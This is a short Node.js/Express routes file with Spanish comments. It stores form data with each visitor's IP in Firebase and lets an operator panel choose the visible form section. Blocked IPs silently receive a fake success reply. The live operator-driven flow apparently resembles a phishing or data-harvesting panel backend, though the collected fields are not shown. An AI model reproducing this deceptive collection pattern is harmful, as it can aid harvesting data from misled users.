/**
 * publicRoutes.js
 * Endpoints públicos — los usa el frontend del formulario
 * Sin rate limiting automático — bloqueo solo manual via panel
 */

const express = require('express');
const router = express.Router();
const firebase = require('../services/firebaseService');
const rateLimiter = require('../middleware/rateLimiter');

// ── POST /api/data — Escribir/actualizar datos de un cliente ──────────────────
router.post('/data', async (req, res) => {
  try {
    const ip = req.clientIP || '0.0.0.0';

    // Verificar si la IP está bloqueada manualmente (via botón BLOQUEAR del panel)
    if (rateLimiter.isBlacklisted(ip)) {
      // Silent block: respuesta falsa para que no sepa que está bloqueado
      const delay = 50 + Math.random() * 150;
      return setTimeout(() => res.json({ ok: true }), delay);
    }

    const body = req.body || {};
    const clienteid = body.clienteid;

    if (!clienteid || typeof clienteid !== 'string' || clienteid.trim() === '') {
      return res.json({ ok: false, error: 'clienteid requerido' });
    }

    // Verificar que hay al menos un campo de datos
    const hasCampo = firebase.CAMPOS_PERMITIDOS.some(c => body[c] !== undefined);
    if (!hasCampo) {
      return res.json({ ok: false, error: 'Sin campos' });
    }

    // Inyectar IP del cliente (server-side, no manipulable)
    body.ip = ip;

    await firebase.setCliente(clienteid.trim(), body);
    res.json({ ok: true });

  } catch (err) {
    console.error('Error en POST /api/data:', err.message);
    res.json({ ok: false, error: 'Error al guardar datos' });
  }
});

// ── GET /api/section/:clienteid — Obtener sectionVisible (fallback polling) ───
router.get('/section/:clienteid', async (req, res) => {
  try {
    const clienteid = req.params.clienteid;

    if (!clienteid) {
      return res.json({ ok: false, error: 'clienteid requerido' });
    }

    const data = await firebase.getSection(clienteid);
    if (!data) {
      return res.json({ ok: false, error: 'no encontrado' });
    }

    res.json({
      ok: true,
      sectionVisible: data.sectionVisible
    });

  } catch (err) {
    console.error('Error en GET /api/section:', err.message);
    res.json({ ok: false, error: 'Error al consultar' });
  }
});

module.exports = router;
